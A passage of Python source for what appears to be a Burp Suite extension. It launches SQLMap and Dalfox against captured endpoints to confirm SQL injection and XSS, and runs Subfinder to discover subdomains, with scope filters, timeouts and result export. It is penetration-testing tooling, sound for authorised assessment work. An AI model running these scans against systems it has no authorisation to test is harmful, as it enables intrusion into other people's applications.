        sqlmap_path = self.sqlmap_path_field.getText().strip()
        if not sqlmap_path:
            self.sqlmap_area.setText("[!] Configure SQLMap path first\n")
            return
        if not self.api_data:
            self.sqlmap_area.setText("[!] No endpoints captured. Capture/import first.\n")
            return
        if not self._validate_binary_signature(
            "SQLMap",
            sqlmap_path,
            self.sqlmap_area,
            required_tokens=["-u", "--batch", "--level"],
            forbidden_tokens=[],
            fix_hint="Set SQLMap path to your local sqlmap binary (for example: ~/.local/bin/sqlmap).",
        ):
            return

        max_targets = self._parse_positive_int(
            self.sqlmap_max_targets_field.getText(), 12, 1, 100
        )
        per_target_timeout = self._parse_positive_int(
            self.sqlmap_target_timeout_field.getText(), 45, 10, 300
        )
        profile_value = self._selected_profile_value(
            getattr(self, "sqlmap_profile_combo", None)
        )
        targets = self._collect_verify_targets(["sql injection"], max_targets)
        if not targets:
            self.sqlmap_area.setText(
                "[!] No SQLi verification targets.\n[*] Generate fuzzing attacks first.\n"
            )
            return

        self.sqlmap_area.setText("[*] SQLMap verification starting...\n")
        self.sqlmap_area.append("[*] Targets: {}\n".format(len(targets)))
        self.sqlmap_area.append("[*] Profile: {}\n".format(profile_value))
        self.sqlmap_area.append("[*] Timeout per target: {}s\n\n".format(per_target_timeout))
        self._clear_tool_cancel("sqlmap")

        def run_verify():
            findings = []
            verified_candidates = []
            checked = 0
            cancelled = False

            for idx, target in enumerate(targets):
                if self._is_tool_cancelled("sqlmap"):
                    cancelled = True
                    break

                checked += 1
                url = target["url"]
                endpoint_key = target["endpoint_key"]
                method = target.get("method", "GET")
                cmd = []
                profile_cfg = {"profile": profile_value}
                try:
                    cmd, profile_cfg = self._build_sqlmap_command(
                        sqlmap_path, target, profile_value
                    )
                except Exception as build_err:
                    self._callbacks.printError(
                        "SQLMap profile builder fallback: {}".format(str(build_err))
                    )
                    cmd = [
                        sqlmap_path,
                        "-u",
                        url,
                        "--batch",
                        "--level",
                        "2",
                        "--risk",
                        "1",
                        "--threads",
                        "1",
                        "--timeout",
                        "8",
                        "--retries",
                        "1",
                        "--flush-session",
                    ]
                    if target.get("params"):
                        cmd.extend(["-p", ",".join(target.get("params", [])[:6])])
                    data = target.get("data", "")
                    if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
                        cmd.extend(["--method", method, "--data", data[:1200]])
                if not profile_cfg:
                    profile_cfg = {"profile": profile_value}
                display_cmd = " ".join(cmd)
                SwingUtilities.invokeLater(
                    lambda i=idx + 1, t=len(targets), c=display_cmd, p=profile_cfg.get("profile", profile_value): self.sqlmap_area.append(
                        "[*] ({}/{}) [{}] {}\n".format(i, t, p, c)
                    )
                )

                process = None
                timed_out = False
                capture_path = None
                try:
                    capture_fd, capture_path = tempfile.mkstemp(
                        prefix="burp_sqlmap_", suffix=".log"
                    )
                    os.close(capture_fd)
                    capture_handle = open(capture_path, "wb")
                    try:
                        process = subprocess.Popen(
                            cmd,
                            stdout=capture_handle,
                            stderr=subprocess.STDOUT,
                            shell=False,
                        )
                    finally:
                        capture_handle.close()
                    self._set_active_tool_process("sqlmap", process)
                    start_wait = time_module.time()
                    while process.poll() is None:
                        if self._is_tool_cancelled("sqlmap"):
                            cancelled = True
                            self._terminate_process_cross_platform(process, "SQLMap")
                            break
                        if (time_module.time() - start_wait) > per_target_timeout:
                            timed_out = True
                            self._terminate_process_cross_platform(process, "SQLMap")
                            break
                        time_module.sleep(0.2)
                    if process.poll() is None:
                        process.wait()
                    combined = ""
                    if capture_path and os.path.exists(capture_path):
                        with open(capture_path, "rb") as capture_reader:
                            combined = self._decode_process_data(
                                capture_reader.read(), "SQLMap output"
                            )
                    evidence = self._extract_sqlmap_evidence(combined)

                    if evidence:
                        findings.append(
                            "[HIGH] {} | {} | {}".format(endpoint_key, url, evidence)
                        )
                        verified_candidates.append(
                            {"method": method, "url": url, "endpoint_key": endpoint_key}
                        )
                    elif timed_out:
                        findings.append("[MEDIUM] {} | {} | timed out".format(endpoint_key, url))
                except Exception as e:
                    findings.append(
                        "[MEDIUM] {} | {} | error: {}".format(
                            endpoint_key, url, self._ascii_safe(e)
                        )
                    )
                finally:
                    if capture_path and os.path.exists(capture_path):
                        try:
                            os.remove(capture_path)
                        except Exception as cleanup_err:
                            self._callbacks.printError(
                                "SQLMap capture cleanup error: {}".format(
                                    str(cleanup_err)
                                )
                            )
                    self._clear_active_tool_process("sqlmap", process)

                if cancelled:
                    break

            with self.sqlmap_lock:
                self.sqlmap_findings = list(findings)
                self.sqlmap_verified_candidates = list(verified_candidates)

            summary = []
            summary.append("\n" + "=" * 80)
            summary.append("SQLMAP VERIFY RESULTS")
            summary.append("=" * 80)
            summary.append("[*] Checked: {}".format(checked))
            summary.append("[*] Verified: {}".format(len(verified_candidates)))
            summary.append("[*] Findings lines: {}".format(len(findings)))
            if cancelled:
                summary.append("[!] Run cancelled by user")
            summary.append("")
            summary.extend(findings[:60] if findings else ["[+] No SQLi confirmations"])
            if len(findings) > 60:
                summary.append("[*] {} more lines not shown".format(len(findings) - 60))

            SwingUtilities.invokeLater(
                lambda t="\n".join(summary) + "\n": self.sqlmap_area.append(t)
            )
            SwingUtilities.invokeLater(
                lambda: self.log_to_ui(
                    "[+] SQLMap verify complete: {} checked, {} verified".format(
                        checked, len(verified_candidates)
                    )
                )
            )
            self._clear_tool_cancel("sqlmap")

        worker = threading.Thread(target=run_verify)
        worker.daemon = True
        worker.start()

    def _export_sqlmap_results(self):
        """Export SQLMap verification findings."""
        with self.sqlmap_lock:
            data = list(self.sqlmap_findings)
        self._export_list_to_file(
            data, "SQLMapVerify_Export", self.sqlmap_area, "sqlmap findings"
        )

    def _send_sqlmap_to_recon(self):
        """Send SQLMap-verified candidates to Recon."""
        with self.sqlmap_lock:
            candidates = list(self.sqlmap_verified_candidates)
        if not candidates:
            self.sqlmap_area.append("\n[!] No SQLMap-verified endpoints to send\n")
            return
        self._import_endpoint_candidates_to_recon(
            candidates, "sqlmap-verified", self.sqlmap_area
        )

    def _run_dalfox_verify(self, event):
        """Run Dalfox verification over reflected-XSS candidates."""
        import os
        import subprocess
        import tempfile
        import time as time_module

        dalfox_path = self.dalfox_path_field.getText().strip()
        if not dalfox_path:
            self.dalfox_area.setText("[!] Configure Dalfox path first\n")
            return
        if not self.api_data:
            self.dalfox_area.setText("[!] No endpoints captured. Capture/import first.\n")
            return
        if not self._validate_binary_signature(
            "Dalfox",
            dalfox_path,
            self.dalfox_area,
            required_tokens=["url", "--format", "--output"],
            forbidden_tokens=[],
            fix_hint="Set Dalfox path to your local dalfox binary (for example: ~/go/bin/dalfox).",
        ):
            return

        max_targets = self._parse_positive_int(
            self.dalfox_max_targets_field.getText(), 12, 1, 100
        )
        per_target_timeout = self._parse_positive_int(
            self.dalfox_target_timeout_field.getText(), 40, 10, 300
        )
        profile_value = self._selected_profile_value(
            getattr(self, "dalfox_profile_combo", None)
        )
        targets = self._collect_verify_targets(["xss"], max_targets)
        if not targets:
            self.dalfox_area.setText(
                "[!] No XSS verification targets.\n[*] Generate fuzzing attacks first.\n"
            )
            return

        self.dalfox_area.setText("[*] Dalfox verification starting...\n")
        self.dalfox_area.append("[*] Targets: {}\n".format(len(targets)))
        self.dalfox_area.append("[*] Profile: {}\n".format(profile_value))
        self.dalfox_area.append("[*] Timeout per target: {}s\n\n".format(per_target_timeout))
        self._clear_tool_cancel("dalfox")

        def run_verify():
            findings = []
            verified_candidates = []
            checked = 0
            cancelled = False
            temp_dir = tempfile.mkdtemp(prefix="burp_dalfox_")

            try:
                for idx, target in enumerate(targets):
                    if self._is_tool_cancelled("dalfox"):
                        cancelled = True
                        break
                    checked += 1
                    url = target["url"]
                    endpoint_key = target["endpoint_key"]
                    out_file = os.path.join(temp_dir, "dalfox_{}.jsonl".format(idx))
                    method = target.get("method", "GET")
                    cmd = []
                    profile_cfg = {"profile": profile_value}
                    try:
                        cmd, profile_cfg = self._build_dalfox_command(
                            dalfox_path, target, out_file, profile_value
                        )
                    except Exception as build_err:
                        self._callbacks.printError(
                            "Dalfox profile builder fallback: {}".format(str(build_err))
                        )
                        cmd = [
                            dalfox_path,
                            "url",
                            url,
                            "--format",
                            "jsonl",
                            "-o",
                            out_file,
                            "--no-color",
                            "--timeout",
                            "8",
                            "--worker",
                            "30",
                        ]
                        for param in target.get("params", [])[:4]:
                            cmd.extend(["-p", param])
                        data = target.get("data", "")
                        if method in ["POST", "PUT", "PATCH", "DELETE"] and data:
                            cmd.extend(["-X", method, "-d", data[:1200]])
                    if not profile_cfg:
                        profile_cfg = {"profile": profile_value}

                    SwingUtilities.invokeLater(
                        lambda i=idx + 1, t=len(targets), c=" ".join(cmd), p=profile_cfg.get("profile", profile_value): self.dalfox_area.append(
                            "[*] ({}/{}) [{}] {}\n".format(i, t, p, c)
                        )
                    )

                    process = None
                    timed_out = False
                    capture_path = None
                    try:
                        capture_fd, capture_path = tempfile.mkstemp(
                            prefix="burp_dalfox_", suffix=".log"
                        )
                        os.close(capture_fd)
                        capture_handle = open(capture_path, "wb")
                        try:
                            process = subprocess.Popen(
                                cmd,
                                stdout=capture_handle,
                                stderr=subprocess.STDOUT,
                                shell=False,
                            )
                        finally:
                            capture_handle.close()
                        self._set_active_tool_process("dalfox", process)
                        start_wait = time_module.time()
                        while process.poll() is None:
                            if self._is_tool_cancelled("dalfox"):
                                cancelled = True
                                self._terminate_process_cross_platform(process, "Dalfox")
                                break
                            if (time_module.time() - start_wait) > per_target_timeout:
                                timed_out = True
                                self._terminate_process_cross_platform(process, "Dalfox")
                                break
                            time_module.sleep(0.2)

                        if process.poll() is None:
                            process.wait()
                        combined = ""
                        if capture_path and os.path.exists(capture_path):
                            with open(capture_path, "rb") as capture_reader:
                                combined = self._decode_process_data(
                                    capture_reader.read(), "Dalfox output"
                                )
                        evidence = ""

                        if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
                            with open(out_file, "r") as reader:
                                first_line = reader.readline().strip()
                            evidence = self._ascii_safe(first_line)[:240]
                        if not evidence:
                            evidence = self._extract_dalfox_evidence(combined)

                        if evidence:
                            findings.append(
                                "[HIGH] {} | {} | {}".format(endpoint_key, url, evidence)
                            )
                            verified_candidates.append(
                                {"method": method, "url": url, "endpoint_key": endpoint_key}
                            )
                        elif timed_out:
                            findings.append("[MEDIUM] {} | {} | timed out".format(endpoint_key, url))
                    except Exception as e:
                        findings.append(
                            "[MEDIUM] {} | {} | error: {}".format(
                                endpoint_key, url, self._ascii_safe(e)
                            )
                        )
                    finally:
                        if capture_path and os.path.exists(capture_path):
                            try:
                                os.remove(capture_path)
                            except Exception as cleanup_err:
                                self._callbacks.printError(
                                    "Dalfox capture cleanup error: {}".format(
                                        str(cleanup_err)
                                    )
                                )
                        self._clear_active_tool_process("dalfox", process)

                    if cancelled:
                        break
            finally:
                self._cleanup_temp_dir(temp_dir, "dalfox verify")

            with self.dalfox_lock:
                self.dalfox_findings = list(findings)
                self.dalfox_verified_candidates = list(verified_candidates)

            summary = []
            summary.append("\n" + "=" * 80)
            summary.append("DALFOX VERIFY RESULTS")
            summary.append("=" * 80)
            summary.append("[*] Checked: {}".format(checked))
            summary.append("[*] Verified: {}".format(len(verified_candidates)))
            summary.append("[*] Findings lines: {}".format(len(findings)))
            if cancelled:
                summary.append("[!] Run cancelled by user")
            summary.append("")
            summary.extend(findings[:60] if findings else ["[+] No XSS confirmations"])
            if len(findings) > 60:
                summary.append("[*] {} more lines not shown".format(len(findings) - 60))

            SwingUtilities.invokeLater(
                lambda t="\n".join(summary) + "\n": self.dalfox_area.append(t)
            )
            SwingUtilities.invokeLater(
                lambda: self.log_to_ui(
                    "[+] Dalfox verify complete: {} checked, {} verified".format(
                        checked, len(verified_candidates)
                    )
                )
            )
            self._clear_tool_cancel("dalfox")

        worker = threading.Thread(target=run_verify)
        worker.daemon = True
        worker.start()

    def _export_dalfox_results(self):
        """Export Dalfox verification findings."""
        with self.dalfox_lock:
            data = list(self.dalfox_findings)
        self._export_list_to_file(
            data, "DalfoxVerify_Export", self.dalfox_area, "dalfox findings"
        )

    def _send_dalfox_to_recon(self):
        """Send Dalfox-verified candidates to Recon."""
        with self.dalfox_lock:
            candidates = list(self.dalfox_verified_candidates)
        if not candidates:
            self.dalfox_area.append("\n[!] No Dalfox-verified endpoints to send\n")
            return
        self._import_endpoint_candidates_to_recon(
            candidates, "dalfox-verified", self.dalfox_area
        )

    def _collect_asset_domain_candidates(self, max_candidates=50):
        """Collect ranked asset-domain candidates from explicit input and proxy history."""
        try:
            max_items = int(max_candidates)
        except Exception as e:
            self._callbacks.printError(
                "Asset candidate max parsing failed: {}".format(self._ascii_safe(e))
            )
            max_items = 50
        if max_items <= 0:
            max_items = 50

        candidate_scores = {}
        selected_host = "all"
        force_host = False
        scope_override = self._get_target_scope_override()
        try:
            if hasattr(self, "host_filter") and self.host_filter is not None:
                selected_host = self._ascii_safe(
                    str(self.host_filter.getSelectedItem()), lower=True
                ).strip()
        except Exception as e:
            self._callbacks.printError(
                "Asset host-filter read error: {}".format(self._ascii_safe(e))
            )
            selected_host = "all"
        force_host = bool(selected_host and selected_host != "all")
        selected_base = self._infer_base_domain(selected_host) if force_host else ""

        explicit_values = []
        if hasattr(self, "asset_domains_field") and self.asset_domains_field is not None:
            explicit_values = self._parse_comma_newline_values(
                self.asset_domains_field.getText()
            )
        for raw in explicit_values:
            host = self._ascii_safe(raw, lower=True).strip()
            if "://" in host:
                host = self._extract_scope_host(host)
            host = self._ascii_safe(host, lower=True).strip().lstrip("*.").rstrip(".")
            if not host:
                continue
            base = self._infer_base_domain(host)
            if not base:
                continue
            candidate_scores[base] = candidate_scores.get(base, 0) + 30

        with self.lock:
            snapshot = list(self.api_data.values())

        for entries in snapshot:
            entry = self._get_entry(entries)
            host = self._ascii_safe(entry.get("host") or "", lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            if force_host:
                host_base = self._infer_base_domain(host)
                if host != selected_host and host_base != selected_base:
                    continue
            elif self._is_wayback_noise_host(host):
                continue
            base = self._infer_base_domain(host)
            if not base:
                continue
            weight = 2 if not self._ffuf_is_noise_host(host) else 1
            candidate_scores[base] = candidate_scores.get(base, 0) + weight

        ordered = sorted(
            candidate_scores.items(), key=lambda item: (-int(item[1]), item[0])
        )
        return [
            {"domain": domain, "score": int(score)}
            for domain, score in ordered[:max_items]
        ]

    def _autopopulate_asset_domains_from_history(
        self, overwrite=False, append_output=False
    ):
        """Populate Subfinder domain textbox with selected proxy-history candidates."""
        if not hasattr(self, "asset_domains_field") or self.asset_domains_field is None:
            return []

        current_values = self._parse_comma_newline_values(
            self.asset_domains_field.getText()
        )
        if current_values and (not overwrite):
            self.asset_selected_domains = list(current_values)
            return list(current_values)

        candidates = self._collect_asset_domain_candidates(max_candidates=50)
        self.asset_target_candidates = list(candidates)
        candidate_domains = [item.get("domain") for item in candidates if item.get("domain")]
        if not candidate_domains:
            if append_output and hasattr(self, "asset_area") and self.asset_area is not None:
                self.asset_area.append("[!] No Subfinder targets found in proxy history\n")
            return []

        selected = []
        existing = list(getattr(self, "asset_selected_domains", []) or [])
        if existing and (not overwrite):
            selected = [d for d in existing if d in candidate_domains]
        if not selected:
            selected = list(candidate_domains)

        max_field_value = "8"
        if hasattr(self, "asset_max_domains_field") and self.asset_max_domains_field is not None:
            max_field_value = self.asset_max_domains_field.getText()
        max_domains = self._parse_positive_int(max_field_value, 8, 1, 50)
        selected = selected[:max_domains]
        self.asset_selected_domains = list(selected)
        self.asset_domains_field.setText(", ".join(selected))

        if append_output and hasattr(self, "asset_area") and self.asset_area is not None:
            self.asset_area.append(
                "[+] Subfinder targets selected from history: {}\n".format(
                    len(selected)
                )
            )
        return list(selected)

    def _show_asset_targets_popup(self, event):
        """Show selectable Subfinder target domains from proxy history."""
        candidates = self._collect_asset_domain_candidates(max_candidates=80)
        self.asset_target_candidates = list(candidates)
        if not candidates:
            if hasattr(self, "asset_area") and self.asset_area is not None:
                self.asset_area.setText(
                    "[!] No Subfinder targets found in proxy history\n[*] Enter domains manually in textbox.\n"
                )
            return

        options = []
        for idx, item in enumerate(candidates):
            domain = self._ascii_safe(item.get("domain") or "").strip()
            if not domain:
                continue
            score = int(item.get("score") or 0)
            options.append(
                {
                    "value": domain,
                    "label": "#{:02d} [score {}] {}".format(idx + 1, score, domain),
                }
            )

        preselected = list(getattr(self, "asset_selected_domains", []) or [])
        if not preselected:
            preselected = [item.get("value") for item in options]

        selected = self._show_multi_select_targets_popup(
            "Subfinder Targets",
            options,
            preselected_values=preselected,
            footer_text=(
                "Default selection is all likely domains from proxy history. "
                "Deselect domains you do not want to scan."
            ),
        )
        if selected is None:
            return

        max_domains = self._parse_positive_int(
            self.asset_max_domains_field.getText(), 8, 1, 50
        )
        selected = list(selected[:max_domains])
        self.asset_selected_domains = list(selected)
        self.asset_domains_field.setText(", ".join(selected))

        if hasattr(self, "asset_area") and self.asset_area is not None:
            self.asset_area.append(
                "[+] Subfinder target selection updated: {} domains\n".format(
                    len(selected)
                )
            )

    def _extract_domains_for_asset_discovery(self, max_domains):
        """Collect unique root domains from input field or Recon hosts."""
        explicit = self._ascii_safe(self.asset_domains_field.getText()).strip()
        domains = []
        seen = set()
        source_counts = {"manual": 0, "selected": 0, "history": 0}
        dropped_noise = 0
        dropped_scope = 0
        selected_host = "all"
        force_host = False
        scope_override = self._get_target_scope_override()
        try:
            if hasattr(self, "host_filter") and self.host_filter is not None:
                selected_host = self._ascii_safe(
                    str(self.host_filter.getSelectedItem()), lower=True
                ).strip()
        except Exception as e:
            self._callbacks.printError(
                "Asset host-filter read error: {}".format(self._ascii_safe(e))
            )
            selected_host = "all"
        force_host = bool(selected_host and selected_host != "all")
        selected_base = self._infer_base_domain(selected_host) if force_host else ""
        if explicit:
            normalized = explicit.replace(",", "\n")
            for raw in normalized.splitlines():
                domain = self._ascii_safe(raw, lower=True).strip()
                if not domain:
                    continue
                if "://" in domain:
                    domain = self._extract_scope_host(domain)
                if domain and domain not in seen:
                    seen.add(domain)
                    domains.append(domain)
                    source_counts["manual"] += 1
                    if len(domains) >= max_domains:
                        self.asset_domain_meta = {
                            "source_counts": source_counts,
                            "dropped_noise": dropped_noise,
                            "dropped_scope": dropped_scope,
                            "selected_host": selected_host,
                            "scope_enabled": bool(scope_override.get("enabled")),
                        }
                        return domains

        selected_domains = list(getattr(self, "asset_selected_domains", []) or [])
        for domain in selected_domains:
            safe_domain = self._ascii_safe(domain, lower=True).strip()
            if not safe_domain or safe_domain in seen:
                continue
            seen.add(safe_domain)
            domains.append(safe_domain)
            source_counts["selected"] += 1
            if len(domains) >= max_domains:
                self.asset_domain_meta = {
                    "source_counts": source_counts,
                    "dropped_noise": dropped_noise,
                    "dropped_scope": dropped_scope,
                    "selected_host": selected_host,
                    "scope_enabled": bool(scope_override.get("enabled")),
                }
                return domains

        with self.lock:
            hosts = [
                self._get_entry(entries).get("host", "")
                for entries in self.api_data.values()
            ]
        host_counter = {}
        for host in hosts:
            host_text = self._ascii_safe(host, lower=True).strip()
            if not host_text:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host_text, scope_override
            ):
                dropped_scope += 1
                continue
            host_base = self._infer_base_domain(host_text) or host_text
            if force_host:
                if host_text != selected_host and host_base != selected_base:
                    dropped_scope += 1
                    continue
            elif self._is_wayback_noise_host(host_text):
                dropped_noise += 1
                continue
            base = self._infer_base_domain(host_text) or host_text
            host_counter[base] = host_counter.get(base, 0) + 1
        ranked = sorted(host_counter.items(), key=lambda item: (-item[1], item[0]))
        for domain, _ in ranked:
            if domain not in seen:
                seen.add(domain)
                domains.append(domain)
                source_counts["history"] += 1
                if len(domains) >= max_domains:
                    break
        self.asset_domain_meta = {
            "source_counts": source_counts,
            "dropped_noise": dropped_noise,
            "dropped_scope": dropped_scope,
            "selected_host": selected_host,
            "scope_enabled": bool(scope_override.get("enabled")),
        }
        return domains

    def _run_command_stage(
        self,
        tool_key,
        tool_name,
        cmd,
        output_area,
        timeout_seconds,
        heartbeat_seconds=0,
    ):
        """Run one subprocess stage with cancellation and timeout."""
        import subprocess
        import time as time_module

        process = None
        try:
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False
            )
            self._set_active_tool_process(tool_key, process)
            start_wait = time_module.time()
            last_heartbeat = start_wait
            while process.poll() is None:
                if self._is_tool_cancelled(tool_key):
                    self._terminate_process_cross_platform(process, tool_name)
                    return False, True, "", "cancelled"
                elapsed = time_module.time() - start_wait
                if elapsed > timeout_seconds:
                    self._terminate_process_cross_platform(process, tool_name)
                    return False, False, "", "timeout"
                if (
                    heartbeat_seconds
                    and heartbeat_seconds > 0
                    and (time_module.time() - last_heartbeat) >= heartbeat_seconds
                ):
                    last_heartbeat = time_module.time()
                    if output_area is not None:
                        SwingUtilities.invokeLater(
                            lambda e=int(elapsed), t=self._ascii_safe(tool_name): output_area.append(
                                "[*] {} still running... {}s elapsed\n".format(t, e)
                            )
                        )
                time_module.sleep(0.2)

            stdout_data = self._safe_pipe_read(process.stdout, "{} stdout".format(tool_name))
            stderr_data = self._safe_pipe_read(process.stderr, "{} stderr".format(tool_name))
            ok = process.returncode == 0
            err = stderr_data if stderr_data else stdout_data
            return ok, False, stdout_data, self._ascii_safe(err)[:1000]
        except Exception as e:
            return False, False, "", self._ascii_safe(e)
        finally:
            self._clear_active_tool_process(tool_key, process)

    def _run_api_asset_discovery(self, event):
        """Run Subfinder to discover API-related asset domains."""
        import os
        import tempfile

        explicit_domains = self._ascii_safe(self.asset_domains_field.getText()).strip()
        if not explicit_domains:
            self._autopopulate_asset_domains_from_history(
                overwrite=False, append_output=False
            )
            explicit_domains = self._ascii_safe(
                self.asset_domains_field.getText()
            ).strip()
        if (not self.api_data) and (not explicit_domains):
            self.asset_area.setText(
                "[!] No endpoints captured and no domains provided.\n[*] Capture/import first or enter domains manually.\n"
            )
            return

        subfinder_path = self.asset_subfinder_path_field.getText().strip()
        if not subfinder_path:
            self.asset_area.setText("[!] Configure Subfinder path first\n")
            return
        if not self._validate_binary_signature(
            "Subfinder",
            subfinder_path,
            self.asset_area,
            required_tokens=["-d", "-silent"],
            forbidden_tokens=[],
            fix_hint="Set Subfinder Path to your local subfinder binary (for example: /home/teycir/go/bin/subfinder).",
        ):
            return

        max_domains = self._parse_positive_int(
            self.asset_max_domains_field.getText(), 8, 1, 50
        )
        profile_value = self._selected_profile_value(
            getattr(self, "asset_profile_combo", None)
        )
        domains = self._extract_domains_for_asset_discovery(max_domains)
        if not domains:
            self.asset_area.setText("[!] No candidate domains found for discovery\n")
            return

        self.asset_area.setText("[*] Subfinder discovery starting...\n")
        self.asset_area.append("[*] Profile: {}\n".format(profile_value))
        self.asset_area.append("[*] Domains: {}\n\n".format(", ".join(domains)))
        domain_meta = getattr(self, "asset_domain_meta", {}) or {}
        source_counts = domain_meta.get("source_counts", {}) or {}
        self.asset_area.append(
            "[*] Sources: manual={}, selected={}, history={}\n".format(
                int(source_counts.get("manual", 0) or 0),
                int(source_counts.get("selected", 0) or 0),
                int(source_counts.get("history", 0) or 0),
            )
        )
        self.asset_area.append(
            "[*] Filter: host={} scope_enabled={} dropped_noise={} dropped_scope={}\n\n".format(
                self._ascii_safe(domain_meta.get("selected_host") or "all"),
                bool(domain_meta.get("scope_enabled")),
                int(domain_meta.get("dropped_noise", 0) or 0),
                int(domain_meta.get("dropped_scope", 0) or 0),
            )
        )
        self._clear_tool_cancel("assetdiscovery")

        def run_discovery():
            temp_dir = tempfile.mkdtemp(prefix="burp_assets_")
            domains_file = os.path.join(temp_dir, "domains.txt")
            output_file = os.path.join(temp_dir, "subfinder.txt")
            discovered_domains = []

            try:
                with open(domains_file, "w") as writer:
                    for domain in domains:
                        writer.write(domain + "\n")

                profile_cfg = {"profile": profile_value}
                timeout_seconds = 240
                try:
                    profile_cfg = self._asset_profile_settings(profile_value)
                    timeout_seconds = int(profile_cfg.get("subfinder_timeout", 240))
                except Exception as build_err:
                    self._callbacks.printError(
                        "Asset profile builder fallback: {}".format(str(build_err))
                    )
                    timeout_seconds = 240

                use_custom_subfinder, custom_subfinder_command = self._resolve_custom_command(
                    "Subfinder",
                    self.asset_custom_cmd_checkbox,
                    self.asset_custom_cmd_field,
                    {
                        "subfinder_path": subfinder_path,
                        "domains_file": domains_file,
                        "output_file": output_file,
                    },
                    self.asset_area,
                )
                if use_custom_subfinder and not custom_subfinder_command:
                    return

                if use_custom_subfinder and custom_subfinder_command:
                    cmd = self._build_shell_command(custom_subfinder_command)
                    display_cmd = custom_subfinder_command
                    uses_output_file = output_file in custom_subfinder_command
                    SwingUtilities.invokeLater(
                        lambda: self.asset_area.append(
                            "[*] Custom command override enabled\n"
                        )
                    )
                else:
                    cmd = [
                        subfinder_path,
                        "-dL",
                        domains_file,
                        "-silent",
                        "-o",
                        output_file,
                    ]
                    display_cmd = " ".join(cmd)
                    uses_output_file = True

                SwingUtilities.invokeLater(
                    lambda c=display_cmd, p=profile_cfg.get("profile", profile_value): self.asset_area.append(
                        "[*] [{}] Subfinder: {}\n".format(p, c)
                    )
                )

                ok, was_cancelled, stdout_data, err = self._run_command_stage(
                    "assetdiscovery",
                    "Subfinder",
                    cmd,
                    self.asset_area,
                    timeout_seconds,
                    heartbeat_seconds=12,
                )
                if was_cancelled:
                    SwingUtilities.invokeLater(
                        lambda: self.asset_area.append("[!] Asset discovery cancelled by user\n")
                    )
                    return
                if not ok:
                    SwingUtilities.invokeLater(
                        lambda e=err: self.asset_area.append(
                            "[!] Subfinder failed: {}\n".format(e)
                        )
                    )
                else:
                    SwingUtilities.invokeLater(
                        lambda: self.asset_area.append(
                            "[+] Subfinder command completed successfully\n"
                        )
                    )

                stdout_len = len(self._ascii_safe(stdout_data))
                stderr_preview = self._ascii_safe(err or "").strip()
                if stdout_len > 0:
                    SwingUtilities.invokeLater(
                        lambda n=stdout_len: self.asset_area.append(
                            "[*] Subfinder stdout size: {} bytes\n".format(n)
                        )
                    )
                if stderr_preview:
                    SwingUtilities.invokeLater(
                        lambda p=stderr_preview[:320]: self.asset_area.append(
                            "[*] Subfinder stderr/stdout preview: {}\n".format(p)
                        )
                    )

                if uses_output_file and os.path.exists(output_file):
                    file_line_count = 0
                    with open(output_file, "r") as reader:
                        for line in reader:
                            file_line_count += 1
                            host = self._ascii_safe(line, lower=True).strip().split(" ")[
                                0
                            ].strip()
                            host = host.lstrip("*.").rstrip(".")
                            if not host:
                                continue
                            discovered_domains.append(host)
                    SwingUtilities.invokeLater(
                        lambda c=file_line_count: self.asset_area.append(
                            "[*] Subfinder output file lines: {}\n".format(c)
                        )
                    )

                if not discovered_domains and stdout_data:
                    for line in self._ascii_safe(stdout_data).splitlines():
                        host = self._ascii_safe(line, lower=True).strip().split(" ")[
                            0
                        ].strip()
                        host = host.lstrip("*.").rstrip(".")
                        if host and "." in host and "/" not in host:
                            discovered_domains.append(host)

                if (not discovered_domains) and (not ok):
                    discovered_domains = sorted(set(domains))
                    SwingUtilities.invokeLater(
                        lambda: self.asset_area.append(
                            "[!] Fallback: using input domains as seed assets\n"
                        )
                    )

                discovered_domains = sorted(set(discovered_domains))
                discovered_urls = [
                    "https://" + host for host in discovered_domains if host
                ]
                with self.asset_lock:
                    self.asset_discovered = list(discovered_urls)

                out_lines = []
                out_lines.append("\n" + "=" * 80)
                out_lines.append("API ASSET DISCOVERY RESULTS")
                out_lines.append("=" * 80)
                out_lines.append("[*] Domains input: {}".format(len(domains)))
                out_lines.append(
                    "[*] Asset domains discovered: {}".format(len(discovered_domains))
                )
                out_lines.append("[*] Asset URLs generated: {}".format(len(discovered_urls)))
                out_lines.append("")
                out_lines.extend(
                    discovered_domains[:120]
                    if discovered_domains
                    else ["[+] No domains discovered"]
                )
                if len(discovered_domains) > 120:
                    out_lines.append(
                        "[*] {} more domains not shown".format(
                            len(discovered_domains) - 120
                        )
                    )
                if use_custom_subfinder and custom_subfinder_command and (not uses_output_file):
                    out_lines.append("")
                    out_lines.append(
                        "[*] Note: custom command does not reference {output_file}; parsed stdout/fallback."
                    )
                out_lines.append("")
                out_lines.append("COPY-READY ASSET DOMAINS")
                out_lines.append("-" * 80)
                out_lines.extend(
                    discovered_domains if discovered_domains else ["[+] No domains discovered"]
                )
                out_lines.append("")
                out_lines.append("COPY-READY ASSET URLS")
                out_lines.append("-" * 80)
                out_lines.extend(
                    discovered_urls if discovered_urls else ["[+] No URLs generated"]
                )
                SwingUtilities.invokeLater(
                    lambda t="\n".join(out_lines) + "\n": self.asset_area.append(t)
                )
                SwingUtilities.invokeLater(
                    lambda: self.log_to_ui(
                        "[+] Subfinder complete: {} domains, {} URLs".format(
                            len(discovered_domains), len(discovered_urls)
                        )
                    )
                )
            finally:
                self._clear_tool_cancel("assetdiscovery")
                self._cleanup_temp_dir(temp_dir, "api asset discovery")

        worker = threading.Thread(target=run_discovery)
        worker.daemon = True
        worker.start()

    def _export_asset_discovery_results(self):
        """Export API asset discovery URLs."""
        with self.asset_lock:
            data = list(self.asset_discovered)
        self._export_list_to_file(
            data, "APIAssets_Export", self.asset_area, "asset URLs"
        )

    def _send_asset_discovery_to_recon(self):
        """Send discovered API asset URLs to Recon."""
        with self.asset_lock:
            urls = list(self.asset_discovered)
        if not urls:
            self.asset_area.append("\n[!] No discovered asset URLs to send\n")
            return
        candidates = [{"method": "GET", "url": url} for url in urls]
        self._import_endpoint_candidates_to_recon(
            candidates, "asset-discovery", self.asset_area
        )

    def _browse_openapi_spec_file(self):
        """Open file chooser for local OpenAPI spec path."""
        chooser = JFileChooser()
        chooser.setDialogTitle("Select OpenAPI/Swagger file")
